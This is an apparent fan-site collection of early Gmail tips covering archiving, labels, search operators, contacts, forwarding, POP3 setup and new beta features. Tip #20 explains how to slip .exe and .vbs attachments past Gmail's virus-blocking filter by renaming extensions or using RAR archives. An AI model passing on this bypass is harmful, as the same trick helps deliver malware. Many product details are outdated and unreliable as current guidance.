Secure HTTPS access is also available by going to https://gmail.google.com directly. This is just another way that Gmail ensures your privacy and security!

[top]	[return to GmailTips.com]

Gmail Tip #12: 'Archiving' Explained
One concept that's sometimes a bit unclear to new Gmail users is that of "Archiving" messages. I'm not refering to the hype and false assertions of pundits who claim things like "Gmail keeps everything you ever send and receive!" and "Gmail archives your messages forever!" No, I'm refering to the "Archive" button in your Inbox view. Just what is it for, and what does it do?" "Plain and simple, clicking Gmail's "Archive" button simply means that the message gets moved out of your Inbox--nothing more, nothing less. It's a convenient and slick way to manage your Inbox.

But just what happens to the message? If you applied a Label to the message and then click "Archive" button, the message will no longer be visible in the Inbox. It will be visible in the applied Label view as well as the "All Mail" view. If no Label was applied, it is removed from the Inbox and is only viewable in the "All Mail" view. In any case, all messages, regardless of how thery are classified, can be viewed in the "All Mail" view. Any Labels that have been applied are shown in the listing. If the message hasn't been "Archived" yet, it will see "Inbox" Label in the "All Mail" view.

Basically, when you "receive" a message, it automatically gets assigned an "Inbox" Label. It's a Label just like any other Label. The only difference is that the Label is just typically hidden while viewing the Inbox. The "Inbox" Label is, however, visible in other views. To test this, take any email that's in your Inbox and apply a Label, but do not Archive it. Go to the view of the Label you applied, and look at the message listing. You should see both the Label you applied as well as an "inbox" Label. It's also visible in the "All Mail" view. When you Archive a message, it simply strips off the "inbox" Label so that it doesn't show up in the Inbox view.

A little tip is that if you are in any other view other than the inbox view, you can always select a message, click on the "More Actions" dropdown, and click on "Move to Inbox" to move it back!"

[top]	[return to GmailTips.com]

Gmail Tip #13: Some More About Conversations
I covered this partially in another tip, but I feel it is important to repeat it. One of Gmail's excellent features is its "Conversations". Conversations conveniently organize related messages, but this can be potentially dangerous if you don't understand how to manage both conversations and individual messages. If you aren't paying attention, you can inadvertently Trash an entire conversation instead of just a single message.

First off, you need to determine if the message is a single message or part of a conversation. While viewing a list of messages (for example, "Inbox") look in the first column on the left of the message listing. A conversation is indicated by some number in parenthesis ie: "(3)" next to Sender's name. The number represents the number of messages associated with this conversation. If you click the checkbox in front of the message and select an action, (ie: "Move to Trash", "Mark as Read", "Delete Forever", "Report as Spam", etc.) the action will affect ALL messages in that conversation. If it is not a conversation, then it will only affect the selected message.

If you want to affect only a single message within a conversation, you must first open the message to view it and then click on the "More Options" link while viewing the message. This allows you to take specific actions on the open message within the conversation.

Conversations are very convenient and powerful, but actually dealing with them can be confusing at times.

[top]	[return to GmailTips.com]

Gmail Tip #14: What Happens To Sent Messages?
When you "send" a message, two things happen to it: 1. it gets copied into your "All Mail" view, and 2. it is visible in the "Sent Mail" view. Many email clients and Webmail services let you optionally delete all sent messages by default, but Gmail doesn't offer this feature. Here's why...

One of Gmail's intentions is to get you out of the "trash everything" mindset. This is one of the reasons why they offer 1GB of storage. Providing this extra space gives you the ability to leverage features such as "Search", "Labels", and "Conversations". Most email services limit us to a very small storage space, so we have to continually delete old messages to allow room for new ones. The problem is that though there are definitely many messages that should be permanently deleted, many are important enough to us that we may need or want to keep them for future reference. Gmail's added space gives us that capability.

In keeping with this "future-thinking" mindset, by retaining the messages you send, Gmail easily and conveniently matches those messages to any corresponding replies onto "Conversations" making following threads of conversation easier. In any case, contrary to some false information being spread, you still retain full control of your messages. Any message, either sent or received, can be easily and permanently deleted as you desire; the same as any other email service.

[top]	[return to GmailTips.com]

Gmail Tip #15: New feature! Highlighting on/off!
Looks like Gmail added a new feature!

You can now control "highlighting" of searched words in Search results!

When you initiate a Search, Gmail returns a list of any messages and conversations matching the Search criteria. You can select any of these messages or conversations to view, and Gmail automatically highlights the word(s) you searched for. My sometimes, it's distracting, so you now have the ability to click on the "Turn off Highlighting" link on the right column. Clicking it again turns highlighting back on. Very nice! And like just about everything about Gmail's interface, it's lightning-fast. No need to wait for the screen to re-draw like in most other Web-based email services.

[top]	[return to GmailTips.com]

Gmail Tip #16: New feature! View or Download for attached images
Looks like Gmail added another new feature! You now have the option of viewing or downloading image attachments! Read on for details...

When you receive an image file as an attachment (like .jpg, .gif, or .bmp) Gmail now displays two links for each attachment: One is the filename, and the other says "Download". Clicking on the name link opens a new browser window and displays the image. Clicking the Download link initiates a standard file download.

Other attachment types simply display the filename letting you download the file. Nice touch!

[top]	[return to GmailTips.com]

Gmail Tip #17: Advanced Search - View Multiple Labels
Gmail has some advanced searching capabilities that, if you take the time to learn, enables you drill down to very specific information. In future tips, you'll learn many of the advanced searching functions, but in this tip, (sent in by "Juan Valera") you'll learn how to search for specific messages based on their Labels including how to search for multiple Labels...

If you want to search for all messages having a specific label, you can click on the "Show search options" link, click the "Search" dropdown, select the desired Lable, and click the "Search Mail" button.

But a shortcut is to type the Label prefixed with the "label:" query word in any simple search field at the top of any Gmail page:

label:Label1

If you want to view all messages that have selected multiple Labels, for example messages having both 'Label1' and 'Label2', enter the following into the simple search field at the top of any Gmail page:

label:Label1 label:Label2

To see all messages with either 'Label1' or 'Label2', you can enter:

label:Label1 OR label:Label2

Note: the specific label names are NOT case sensitive, but the "OR" operator is case sensitive, and must be in uppercase. The pipe operator '|' can also be used in the same manner as 'OR'.

label:Label1 | label:Label2

(Thanks to "Juan Valera" for submitting this tip!)

[top]	[return to GmailTips.com]

Gmail Tip #18: Some Forwarding Idiosyncracies
One very important note to Gmail users: Gmail's "Forward" function only forwards plain text. While this doesn't affect most messages, this behavior can mangle HTML-formatted messages, dropping important formatting, images, and data. Read on for more information...

If you receive a message that has fancy formatting and/or includes inline graphics, when you click on Forward, Gmail strips out all the formatting and forwards only the plain text. This is very apparant with email originating from online services like AOL and with clients like Outlook. For example, I received an email from my parents' AOL account that contained an inline graphic image. I could view it just fine in Gmail, but when I tried to forward it to my wife's email account, it dropped the image and only forwarded the plain text. Yes, I could save the image and then attach it to the forward, but it's a kludgy workaround and not very intuitive to "casual" users. (Note that if you receive an image as an attachment, Gmail DOES handle forwarding properly.)

Theoretically, Gmail could fix this by adding a "Forward as Attachment" option in addition to the standard Forward links. I have emailed Gmail Support about this issue.

Finally, note that while this behavior is not exclusive to Gmail, I feel it's important enough to let people know. In my opinion, this is the one "feature" that prevents me from sending invitations to family and friends who are not computer savvy.

[top]	[return to GmailTips.com]

Gmail Tip #19: Advanced Search - 'Query Words'
One of Gmail's excellent features is its Search function. Searching can be as simple as entering a keyword or two into the Search field at the top of any page to very complex using Gmail's advanced "Query Words" to better constrain searches. Read more to better understand how "Query Words" can help you with your advanced message searching...

Clicking the "Show Search Options" link will open up a pane containing several entry fields and dropdowns. This lets you easily specify more detailed search criteria. For example, say you want to search for all email that is unread, regardless of under what Label it is filed. Simply click the "Search:" dropdown, select "Unread Mail" and click the "Search Mail" button. Gmail will display a list of all unread mesasges. Likewise, you can select specific Labels and you can enter specific terms. It's very powerful and useful.

But as more savvy users, we often crave, as Tim The Toolman Taylor says, "More power!" Gmail also provides users the ability to prefix their search keywords with "query words" that instruct Gmail how to search. And there is no need to open the Search Options--these can be entered in the simple search window at the top of any page.

For example, say you want to search for all messages Labeled with the "Family" Label. You could open the "Show Search Options" pane, select the "Family" Label from the dropdown, and click "Search Mail". Or, you could just enter into the search box at the top of any page "label:family" and hit Enter! Both do the same thing, just in different ways.

But this type of searching goes way beyond this by letting you search using more complex criteria. For example, building on our example above, say you want to search for messages containing attachments from your family sent before May 21, 2004? You would simply enter the following advanced search criteria:

label:family has:attachment before:2004/5/21

Yes, this could actually be done in the Search Options pane, but in addition to the available search criteria fields, query words not only let you search using criteria not included in the Search Options pane, (like "cc:" and "bcc:") but you can do "compound" searches otherwise not available in the Search Options pane. For example:

label:doctors label:statements has:attachment before:2004/5/21 in:anywhere

would return all messages with both Labels of "Doctors" and "Statements" containing attachments, sent before May 21, 2004, existing anywhere in my account including the Trash and Spam views.

It's pretty powerful, and fairly intuitive once you get the hang of it.

For more information, you should check the direct link to Gmail's "How do I use advanced search?" help page found [here] (You may need to be logged into your Gmail account to access this page.)

Here is table of "query words" from that page:

Operator 	Definition 	Example(s)
from: 	Used to specify the sender 	Example - from:amy
Meaning - Messages from Amy
to: 	Used to specify a recipient 	Example - to:david
Meaning - All messages that were sent to David (by you or someone else)
subject: 	Search for words in the subject line 	Example - subject:dinner
Meaning - Messages that have the word "dinner" in the subject
OR 	

Search for messages matching term A or term B*
*OR must be in all caps
	Example - from:amy OR from:david
Meaning - Messages from Amy or from David
-
(hyphen) 	Used to exclude messages from your search 	Example - dinner -movie
Meaning - Messages that contain the word "dinner" but do not contain the word "movie"
label: 	Search for messages by label*
*There isn't a search operator for unlabeled messages 	Example - from:amy label:friends
Meaning - Messages from Amy that have the label "friends"
has:attachment
	Search for messages with an attachment 	Example - from:david has:attachment
Meaning - Messages from David that have an attachment
filename: 	Search for an attachment by name or type 	

Example - filename:physicshomework.txt
Meaning - Messages with an attachment named "physicshomework.txt"

Example - label:work filename:pdf
Meaning - Messages labeled "work" that also have a PDF file as an attachment

" "
(quotes)
	Used to search for an exact phrase*
*Capitalization isn't taken into consideration 	

Example - "i'm feeling lucky"
Meaning - Messages containing the phrase "i'm feeling lucky" or "I'm feeling lucky"

Example - subject:"dinner and a movie"
Meaning - Messages containing the phrase "dinner and a movie" in the subject
( )
	Used to group words
Used specify terms that shouldn't be excluded 	

Example - from:amy (dinner OR movie)
Meaning - Messages from Amy that contain either the word "dinner" or the word "movie"

Example - subject:(dinner movie)
Meaning - Messages in which the subject contains both the word "dinner" and the word "movie"
in:anywhere 	Search for messages anywhere in your account*
*Messages in 'Spam' and 'Trash' are excluded from
searches by default 	Example - in:anywhere subject:movie
Meaning - Messages in 'All Mail', 'Spam', and 'Trash' that contain the word "movie"
in:inbox
in:trash
in:spam 	Search for messages in 'Inbox', 'Trash', or 'Spam' 	Example - in:trash from:amy
Meaning - Messages from Amy that are in the trash
is:starred
is:unread
is:read
	Search for messages that are starred, unread or read 	Example - is:read is:starred from:David
Meaning - Message from David that have been read and are marked with a star
cc:
bcc: 	Used to specify recipients in the 'cc' or 'bcc' fields 	Example - cc:david
Meaning - Messages that were cc-ed to David
after:
before:
	Search for messages after or before a certain date*
*Date must be in yyyy/mm/dd format. 	Example - after:2004/4/17 before:2004/4/18
Meaning - Messages sent on April 17, 2004.*
*More precisely: Messages sent on or after April 17, 2004, but before April 18, 2004.

[top]

Gmail Tip #20: Why some attachments bounce
Gmail is trying to help combat the spread of viruses by implementing a "feature" that prevents emails containing attachments of certain file types from being delivered to Gmail accounts. With some simple workarounds, you can get your files delivered to Gmail users while still helping prevent the spread of viruses...

One way that Gmail is helping to prevent the spread of viruses is to prevent the delivery of messages sent from outside of Gmail that .exe and .vbs (and possibly other) extensions. These file attachments are very easy to inadvertently execute, and are a common source of viruses. Gmail is trying to make it at lease a bit more difficult to inadvertently execute these types of files.

If you are sending an email to a Gmail account that contains either extension of .exe or a .vbs (and possibly others) the message WILL bounce as undeliverable. The message will also bounce if these file types are contained within a .ZIP file. If you are sending an email from an outside account to a Gmail user, simply changing the extention to something else appending something like ".txt" lets the message pass through without issue. You could also use another archive format like WinAce or WinRAR as they are not filtered (yet). The point is that the file won't be immediatly and inadvertently executable without some recipient intervention.

Again, note that this only affects inbound email originating from another email provider sent to a Gmail account. This does not affect Gmail users sending email to another Gmail user or to an email address outside of Gmail. Obviously, this isn't a perfect solution, but it's a good start.

[top]	[return to GmailTips.com]

Gmail Tip #21: 'Official' Features and Bugs Status Page
Want to know what features and bugs the Gmail developers are currently working on? Read on to learn how to access Gmail's new "Features, Fixes, & Feedback" page...

First, log into your Gmail account. You must be logged into your account to access the help screens. Next, click on the "Help" link located at the top of any Gmail page. Next, click on the "Send Feedback" link on the left column. You'll be taken to a page detailing features Gmail is working on and bugs being squashed!

While this may not be a definitive list, at least we can get a better picture of what the busy Gmail developers are working on!

[top]	[return to GmailTips.com]

Gmail Tip #22: Advanced Search - Multi-Labeled and Un-Labeled Messages
In an earlier tip, I briefly explained how to perform Advanced Searching using Gmail's "query words". Here are two practical examples of how to use the "label:" query word to search for Multi-Labeled messages as well as Un-Labeled messages. Thanks to "rishid" on the GmailForums for submitting this tip...

Say you want to find messages that have multiple Labels. For example, you want to display all messages with label1, label2 and label3 that you had previously defined and assigned. Into the basic search field at the top of any Gmail page, you would enter label:label1 label:label2 label:label3

Note that this is searching for all messages that have label1 AND label2 AND label3. If you want to include messages that have ANY of those labels, you can use the "OR" command like this: label:label1 OR label:label2 OR label:label3 (Note: "OR" must be in uppercase.)

You can optionally add a "-" to the query words to exclude search criteria. For example, entering -label:label1 label:label2 label:label3 would return all messages that have label 2 AND label 3, but do not have a label1 Label.

Taking this concept a step further, you can use this method to search for all "Un-Labeled" messages. Unfortunatly, Gmail does not provide a choice in the search dropdown that lets you search for unlabeled messages. If you manage a large number of messages, it can be very cumbersome to determine which messages are unlabeled. My personal preference is to ensure that all messages have a Label making it easier to manage and organize them.

So, if you want to list all unlabeled messages, just create a long search string containing every label that you have defined. Be sure to include the "-" character in front of every label. This ensures that messages with these labels will be EXCLUDED (remember, you are looking for all messages WITHOUT Labels.) You can also optionally include the hidden "inbox" Label to exclude anything in your Inbox.

For example, if you have defined the Labels "Family", "Friends", "Ebay", and "Support", you would enter the following string into the search field (note that the labels are not case sensitive) to find all Unlabeled messaegs:

-label:inbox -label:family -label:friends -label:ebay -label:support

If you have a large number of labels, obviously, this becomes harder and harder to manage, so I recommend reating a "note" email to yourself containing the search string for easy future reference.

[top]	[return to GmailTips.com]

Gmail Tip #23: Cleaning Your Contacts
One of Gmail's "features" can leave you with extra entries in your Contacts list. Read on for more information...

Gmail has a (debatably) nice feature that automatically adds to your Contacts list the email addresses of those to whom you send emails. While this can be helpful at times, just remember that EVERY unique email address you send to gets auto-added. So, if someone or some company sends you an emai and you reply to it, the email address will get added. For clarification, it only gets added once. We're talking about "unique" email addresses here. But how do you know what gets added?

Log into your Gmail account and click on the "Contacts" link at the top of any Gmail page. A window will open displaying any Contacts you may have. Any you have manually edited will typically have a "Name" and possibly a "Note" associated with it. By default, any Contact Gmail auto-adds and is unedited will not contain any "name" or "note" information, just the email address. Visually scan down the list and look for any that fall into this category. If you find one, determine what to do with it: Delete is, Edit it, or leave it alone. Obviously what you do with it is up to you, but I make it a personal rule to always edit any email addresses I want to keep and add names (and sometimes notes). Any I don't want, I just delete. This keeps things clean.

Until I realized that Gmail did this, I was surprised as to how many Contacts were added.

So, every once in a while, I take time to be sure to monitor my Contacts list and clean out any unneeded entries.

[top]	[return to GmailTips.com]

Gmail Tip #24: New feature! Import Contacts
Once again, the hard working Gmail Developers have implemented yet another much-requested feature: Import Contacts! Read on for more details...

For the best explanation of just how to Import Contacts, log into your Gmail account, click on Contacts, and click on the new "Import Contacts" link at the top of the Contacts screen.

But what can you import and how do you import? Gmail will let you import address books into Contacts from Yahoo!, Orkut, Outlook, and pretty much any other service by uploading CSV (Comma Separated Value) files to your Gmail account. You can even manually edit and create CVS files for importing using Microsoft Excel.

Just remember that currently, Gmail's Contacts fields are limited to just "Name", "Email Address", and "Notes". According to the Help screen, all other fields will be imported into the Notes field.

Gmail's COntacts aren't sophistocated, but now that you can Import, they certainly are more useful!

One small side note: On the Import Contacts Help page, it reads, "Because Gmail does not offer group or distribution list functionality at this time, this information won't be transferred from other address books into your Gmail Contacts list." The key words to me are "at this time"...not sure if this implies these functions will be incorporated or not, but we can dream...

[top]	[return to GmailTips.com]

Gmail Tip #25: Find Your Unread Messages
Want a quick and easy way to view all of your "Unread" messages? Here's a neat tip submitted by Mark Worsham describing how...

If you have assigned Labels and archived unread messages, finding them later can sometines be challenging. Simply create a Gmail Label named "Unread", and you will see all of your unread mail in that folder. Though there are other ways to display unread messages, the nice thing about this method is that it displays the number of unread messages right in the Label list.

Thanks Mark for the tip!

[top]	[return to GmailTips.com]

Gmail Tip #26: Creating a Pseudo Address Group!
Gmail currently does not provide the facility to send emails to a Group or a List or email addresses. But thanks to an excellent tip submitted by "arianj", we now have a very doable workaround! Read on to see how to set up a pseudo Group Contact...

Although Gmail doesn't currently support Groups in your Contacts, you can simulate a Group list by doing the following:

|1. Create a new Contact

|2. In the "Name" field, enter the name of your Group (eg "My Friends")

|3. In the "E-mail" field, enter your list of email addresses in the following format:

friend1@gmail.com>,<friend2@blah.com>,<friend3@foo.com

Note three things:

|1. You must enter ">,<" (without the quotes) between all addresses

|2. Be sure NOT to include a leading "<" or trainling ">". This is intentional, because during auto-complete, Gmail adds these characters to the beginning and end of the full string that is in the e-mail field.

|3. Also, there should be no spaces in the string.

Again, thanks to "arianj" for submitting this tip!"

[top]	[return to GmailTips.com]

Gmail Tip #27: Adding Hotmail Contacts to Gmail
Do you have a lot of Hotmail contacts that you would like to add to your Gmail Contacts? "Montevino" submitted this tip on how to do just that. Read on to see how simple it is...

By leveraging Gmail's new "Import Contacts" (see Gmail Tip #24), you can easily generate an importable file from your Hotmail Contacts.

Just set up Outlook Express to access your Hotmail account (by creating a new account, making it HTML, not POP3, and giving your Hotmail account name and password.) Then, open Windows Address Book, and synchronize. Address Book finds and auto-ads your Hotmail contacts. You can then easily output your addresses to a *.CSV file, which can then be imported into Gmail.

Thanks, "Montevino" for the tip! His home page can be found at www.livejournal.com/users/montevino.

[top]	[return to GmailTips.com]

Gmail Tip #28: 'Gmail Notifier' released to beta!
Those crazy yet wonderful Gmail Developers have once again brought us a new toy: Gmail Notifier! Read on to see what it is, what it can do, and how you can get it...

The Gmail Notifier is a downloadable Windows application that alerts you when you have new Gmail messages. It displays an icon in your system tray to let you know if you have unread Gmail messages, and shows you their subjects, senders and snippets, all without your having to open a web browser.

You can also have it be the default "mailto:" handler so that when you click on an email address on a Web page, Gmail Notify will open a Compose Window.

You can even define a sound to play when new mail arrives!

To download, go here:
http://toolbar.google.com/gmail-helper/

For FAQ's, go here:
http://toolbar.google.com/gmail-helper/faq.html

Have fun!!!

[top]	[return to GmailTips.com]

Gmail Tip #29: A Small Quirk With Gmail Notify's 'mailto:' Handler
Read on to better understand a small idiosyncracy with Gmail's Gmail Notifier application...

One cool feature of Gmail Notifier is that it can be configured to act as the default "mailto:" handler. When set up to do this. Gmail Notifier will open a Compose Window in a new browser window with the email address auto-filled in.

Just be aware that unless you check the "keep me logged in for two weeks" checkbox on the login screen, you will have to log in every time...even if you are already logged into Gmail in another browser window.

While it can be a bit cumbersom, it's certainly worth the new features!

[top]	[return to GmailTips.com]

Gmail Tip #30: Removing a Label
I just stumbled on this one. (Sometimes during a Beta period, you have to "find" new features yourself!) In the past, when you wanted to remove a Label from one or more messages, you would have to click on the desired Label on the left of the screen, select the message, and then click on the "Remove Label" button. Well, The process has been significantly simplified! Read on for details...
While viewing a message, click on the "More Actions" dropdown, scroll to the bottom of the list, and select the desired Label to remove. Voila...the Label is removed!

If you are viewing a list of messages (say, in your inbox or in a Label view, click the checkboxes of the Labeled messages, click on the "More Actions" dropdown, scroll to the bottom of the list, and select the desired Label to remove. Again, the Label is removed!

Don't forget that if the message has been Archived and you remove all Labels, it will be visible only in the "All Mail" view.

[top]	[return to GmailTips.com]

Gmail Tip #31: Improved and New Contacts Features!
The "Contacts" function has been enhanced to provide some additional functionality, and now adopts the familiar Gmail interface. Read on for the details...
Gmail now displays a "Contacts" link in the left column under the "standard views" (Inbox, Starred, etc.) and just above the Labels. Clicking on the link brings up a nicely formatted display that matches the style of the rest og GMail. It displays the contact name, email address, Note, and any additional information (see below). At the top are two "tabs" that display "Frequently Mailed" and "All Contacts". I don't know what the criteria for "Frequently Mailed" is, but it does contain the most-used contacts.

Here are some new or expanded features:

RECENT CONVERSATIONS
Clicking on a contact displays the contact information as well as "Recent Conversations" associated with that contact. Clicking on one of these entries opens it normally with all options available. Very nice.

ADD MORE CONTACT INFO
Clicking on "Edit" allows you to update the basic contact information (Names, Email Address, Note). But there's a new link: "Add More Contact Info" which lets you add additional "Sections" of information. For example, by default there are "Personal" and "Work" sections defined. Each section contains a Section Name field, Two user-selectable "fields" and an "Address" block. Each User Field has a drop-down label containing the following selectable labels: Phone, Mobile, FAX, Pager, Email, IM, Company, Title, Other. You can also add additional fields as needed.

SEARCH CONTACTS
Near the top of the Contacts screen is a Search field and a "Search Contacts" button. Entering text into this field and clicking the button returns all contacts that BEGINS WITH the text. This is important to know because it will search ALL contact fields (even the :extended fields) for words beginning with the entered text. For example, entering "Ste" would return "Stephanie", "Steve", and "Stewart" but entering "phani" would not return "Stephanie". Obviously, it would be nice to have extended search capabilities, but this is an excellent start!

ADD CONTACTS
Clicking on the "Add Contact" link lets you enter the standard "Basic" information, and clicking the "Add More Contact Info" link opens the extended information screen as descrived above.

IMPORT CONTACTS
The "Import Contacts" links is still there letting you import contacts from a CSV file. According to the documentation, "other" information gets imported into a Notes field. There is no mention of importing into the new "extended" fields.

BETTER INTERFACE
What really makes this shine is the fact that it now uses the same interface as the rest of Gmail giving it some better consistency. That has always been one of Gmail's strengths: a slick, clean, non-cluttered, fast interface. The added Contacts handling keeps with that philosophy.

So there you have it: some improved Contacts functionality!

[top]	[return to GmailTips.com]

Gmail Tip #32: Drafts!
Gmail now has the capability to save "Drafts" of your messages! This is a long-awaited feature that seems to have slipped in under the radar. Read on for more details...
If you are in the middle of composing a message, but want to finish it later, just click on the "Save Draft" button now located between the "Send" and "Discard" buttons. This droops the message in a new view located on the left side called "Drafts" located under the "Sent Mail" link and above the "All Mail" link. Later, you can just click on the message, complete it, and then click "Send" normally.

Yet another example of Gmail providing what the users need!

[top]	[return to GmailTips.com]

Gmail Tip #33: Auto-forward received Gmail!
Want to use your Gmail account as your main email account but have some or all email auto-forwarded to other email accounts? Well, now you can! Read on for more details...
Gmail has added tha ability to forward received emails in two ways: "All" or "Selective"

"ALL" FORWARDING
This is a "global" setting that lets you optionally forward all received email to another email address. Click on the "Settings" link, and click on the new "Forwarding" tab. In there, you have the option do Disable or Enable email forwarding. Click on Enable, enter the email address to which you want to forward, and then select one of the following self-explanatory actions from the associated dropdown:
-keep Gmail's copy in the Inbox
-archive Gmail's copy
-trash Gmail's copy

This setting will forward all received email to another email address and take the appropriate action on the received email.

"SELECTIVE" FORWARDING
Filters have also been enhanced with a new "Forward it to: emailaddress" action letting you selectivly forward emails based on filter criteria. You can use the same or different email addresss for each filter if you choose providing very powerful email management. For example, I may get statement notifications from a bank and want to auto-copy it to my wife. I just set up a filter to select emails with the bank's sending email address and then select the "Forward it to:" action and enter my wife's email address. Now, she'll get notified also!

[top]	[return to GmailTips.com]

Gmail Tip #34: Gmail on your Palm!
If any of you Gmail users own "connected" PalmOS PDA's, you can now use SnapperMail to retrieve your email using Gmail's new POP3 feature! Read on to learn how...
I tried out about 6 different email apps for the PalmOS, and the ONLY one I could get to consistently send and receive email from my Gmail account is Snapper Mail. Here's how to get it working:

Log into your Gmail account, go into Settings, select the "Forwarding and Pop" tab, and enable the type of POP3 you want to do.

Next, launch SnapperMail and create a new POP3 account. In the "Server" tab, fill in the POP3 server with "pop.gmail.com", enter your full gmail email address as the username, and enter your password in the password field. In the "Outgoing SMTP Server" field, enter "smtp.gmail.com", enter your full Gmail Email address, and enter your password.

Finally, AND THIS IS IMPORTANT, tap "More" and make the following settings:

For POP3 settings:
Set the "Use SSL" dropdown to "Always Secure (wrapped port)", set the port to "995" and leave the other checkboxes unchecked.

For SMTP settings:
Set the "Use SSL" dropdown to "Always Secure (STARTTLS)", set the port to either port "465" or "587" and leave the other checkboxes unchecked.

Set up the rules as you wish, and when you tap "Send/Receive" you should be able to send and receive mail!

Works like a charm on my Tungsten C!

SnapperMail can be found at www.snappermail.com

[top]	[return to GmailTips.com]

Gmail Tip #35: Gmail on your Palm! - Part 2
I posted an article on how to access your Gmail account using SnapperMail via Gmail's POP3 feature. Read on to see what other PalmOS email application works as well...
I tried several other email applications, and found another PalmOS email applocation that works very well with Gmail's SSL-secured POP3 connection: Mark/Space Mail from Mark/Space. Like SnapperMail, it is a very slick, full-featured email client, and it provides SSL connectivity. (For those that don't know, this is a "Secure Sockets Layer" security model that Gmail (and many othe Web sites) uses to create a secure connection. This should help boost user confidence in Gmail's security policies.)

To configure Gmail, just enable POP3 in your Gmail Account by clicking on "Settings", click on the "Forwarding and POP3" tab, and then make the appropriate settings based on your situation.

Next, launch Mark/Space Mail, and select "Options > Accounts" and tap "New". Fill in page one with your account information. Tap the Page 2 icon and fill in your username with your FULL Gmail email address. Next, enter "pop.gmail.com" into the "POP3 Host" field and assign your password. Enter "smtp.gmail.com" into the "SMTP Host" field. Next, tap the Page 3 icon and check off BOTH "Use SSL" boxes. For the POP3 port, use "995" and for the SMTP port, use "465" or "587". Check off the "Allow SMTP Authentication" checkbox and then enter your full Gmail email address in the "SMTP Username" field and assign the password.

Tap "OK", tap "Done", and when you tap "Send/Receive", you should connect properly.

This works like a charm on my PalmOne Tungsten C.

Have fun!

[top]	[return to GmailTips.com]

Gmail Tip #36: Some Email Management Tips
This tip is inspired by an inquiry by "Debra" about how to find archived email. Though I cover Archiving in Gmail Tip #12: "Archiving" Explained, I feel that some general email management tips are in order. Managing email within Gmail can be easy or difficult depending on how you handle them. Read on for some simple tips to better manage your email...
First off, when you "archive" an "unlabeled" email message, it simply "drops out" of the Inbox view and is later ONLY accessible from the "All Mail" view. While this is straight forward, it can be cumbersome if you have more than a handful of email messages. The problem with the "All Mail" view is that it includes just that: all email, labeled or otherwise, and Gmail provides no easy way to find "unlabeled" email. To me, an "unlabeled" email is an uncategorized email that has "fallen through the cracks" and must be Labeled. If I don't, short of searching later, I'll never find it again. Why? I currently have over 1600 email message in Gmail, and effective use of Labels and Searching are the only way to manage them effectively.

My general practice is to assign a Label to EVERY email I receive in my Inbox that I'm not going to trash. This way, EVERY email is available through its corresponding Label view.

If you want to "clean up" your unlabeled messages, see my Gmail Tip #22: Advanced Search - Multi-Labeled and Un-Labeled Messages for details on hoe to find "unlabeled" messages.

[top]	[return to GmailTips.com]

Gmail Tip #37: New Feature! Image Attachment Thumbnails
Gmail's site describes it as:

"It's like seeing the trailer before you see the movie. Now you can get a sneak preview of your attachments."

Gmail now adds the ability to preview graphic images attached to email messages you receive by displaying "thumbnails" of the images displayed below the message text. In many cases, you won't even need to open the image, but you still have the familiar "View" and "Download" options.

Yet another step forward in Gmail's ever-evolving interface!

[top]	[return to GmailTips.com]

Gmail Tip #38: Google Gmail Minibrowser
"The Google Deskbar includes a minibrowser that you can use to quickly open your Gmail account in convenient window that automatically hides and can be accessed with a keyboard shortcut. Read on for more information about this tool...
The Google Deskbar is a little Google search tool for Windows taskbar. It can do most of the Google searches using shortcut keys too. (See the link for a picture.) It also include Google's "Minibrowser" which is fast and cute. If you press Ctrl-Alt-G—by default, you can turn it off—you'll go right to the bar. Typing a search, by default, will open in the mini browser—again you can turn it off if you want or have it use your default browser (Firefox, etc).

So here's the tip: Go to Options > Customized Searches > Add. Name it "Gmail" and put in the url: http://gmail.google.com/gmail. For the shortcut I used Ctrl M. So if I press Ctrl alt G, then Ctrl M, instant GMail window in the Google Minibrowser! Awesome.

(Google Desktop isn't included in the default searches either. (Yet!) But you can also add it in the customize dialogue to search your desktop just as easily. Since the minibrowser vanishes automatically it's tres convenient to find a file!)
Thanks "Sketchee" for the tip!


[top]	[return to GmailTips.com]

Gmail Tip #39: New Feature! Gmail From Most Any Browser!
Gmail - Google's Email Service From the beginning, Gmail has always required a "supported browser" to gain access and work with Gmail. Well, those crazy Gmail developers have done it again! Read on to see a new addition to Gmail that will please many...

Gmail now offers a "basic HTML view" that lets you access Gmail from almost any computer running almost any Web browser. Mozilla users and Safari users will certainly appreciate this one. According to the Gmail Help site, if you log into Gmail using a non-supported browser, Gmail will automatically revert to the basic HTML view. Just be aware that several features cannot be accessed from the basic HTML view, only the "full view". From Gmail's help page:

"Since your browser isn't fully supported, you might notice that some of your favorite features aren’t available in the current view, including the following:

-Filter creation
-Settings
-Spell checker
-Keyboard shortcuts
-Address auto-complete"

Now to see if the basic HTML view works with my PDA...


[top]	[return to GmailTips.com]

Gmail Tip #40: New Feature! Rich formatting!
It's the nail in the coffin...the icing on the cake...the "You had me at hello" feature! Gmail finally has Rich Text formatting! But it's not just for making your messages pretty. Read on to see why the addition of this feature propels Gmail way ahead of the competition...

In this tip, I will briefly explain how to enable Gmail's new Rich formatting features, but first, I need to get right to the heart of the matter.

One thing that has bugged me all along with Gmail is how it handles the forwarding of richly formatted (HTML) messages. Whenever I received an email from an AOL user or an Outlook user, more often than not, it would contain rich formatting like different fonts, inline images, etc. The problem was that while Gmail would display the message perfectly while reading, when I went to reply to or forward the message, Gmail would convert everything to plain text, completely mangling the message. All formatting, inline images, and anything else that was not plain text was efficiently removed and forever lost. Needless to say, the end result was FAR from what was really sent to me. My biggest gripe was that if I receive a message, I should be able to reply to or forward it without its basic structure and formatting being altered.

Well that has all changed! By adding the Rich formatting editor, Gmail can now handle forwarding as it should. Kuddos to the Gmail developers!

OK, that said, here's the tip: If you receive a message and reply to or forward it with the plain text editor, all formatting will be stripped and the message will be sent as plain text. That much is the same. There may be cases where you might want to do this, bit not too oftern. If you have the Rich formatting editor enabled, when you reply to or forward the message, Gmail retains all the formatting for you and you can reply to and forward the message with the assurance that it will be received as it was received by you.

To ensure that the Rich editor is enabled, just click on the "Compose mail" link or press "C" if you have Keyboard Shortcuts enabled. Just below the "Attach a file" link, and above the main text entry space, there will be a "Rich formatting >>" link. Click on it, and the Rich formatting tools will display. Next, just discard the message. Gmail will remember your setting between sessions. If you watnt to revert back to Plain Text, just click on the "<< Plain text" link to the right of the Rich formatting tools.

For a list of all the tools and their functions, go to this link where you will see a summary.

